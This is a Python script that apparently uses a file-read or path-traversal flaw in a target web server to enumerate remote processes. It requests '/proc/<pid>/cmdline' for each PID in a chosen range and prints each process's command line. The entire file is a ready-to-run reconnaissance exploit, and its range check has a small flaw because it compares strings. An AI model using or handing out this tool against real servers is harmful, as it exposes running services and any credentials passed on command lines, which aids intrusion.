#!/bin/python3

from optparse import OptionParser
import requests

# Argument parsing
parser = OptionParser(usage = "usage: %prog -u url -r <pid_range>")
parser.add_option("-u", "--url",
                action="store", dest="url", help="Target url")
parser.add_option("-r", "--range",
                action="store", dest="range", help="PID range")
(options, args) = parser.parse_args()

if not ( options.url and options.range):
    parser.error("All parameters are mandatory")

if (options.range.split("-")[0] > options.range.split("-")[1]):
    parser.error("Bad range")

min_pid = int(options.range.split("-")[0])
max_pid = int(options.range.split("-")[1])

# Process enumeration
print("PID\tCMD") 
for i in range (min_pid, max_pid):
    url = options.url + "/proc/" + str(i) + "/cmdline"
    req = requests.get(url)
    if req.content:
        print(str(i) + "\t" + req.content.decode())
